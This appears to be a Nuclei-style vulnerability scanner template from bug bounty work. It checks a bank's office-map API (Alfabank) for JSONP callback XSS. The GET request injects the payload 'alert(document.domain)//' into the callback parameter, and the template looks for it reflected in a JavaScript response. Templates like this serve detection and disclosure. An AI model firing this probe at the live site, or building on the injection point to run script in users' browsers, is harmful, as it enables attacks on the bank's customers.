id: alfabank-jsonp-callback-xss

info:
  name: Alfabank - JSONP Callback XSS
  author: bugbounty
  severity: medium
  description: JSONP callback parameter without validation allows XSS
  tags: xss,jsonp,alfabank

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/warden/map/offices?bbox=55.9552,36.5625,56.0537,37.6172&kinds.includeAny=retailStandart&callback=alert(document.domain)//"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'alert\(document\.domain\)//\('

      - type: word
        part: header
        words:
          - "application/javascript"
          - "text/javascript"

      - type: status
        status:
          - 200
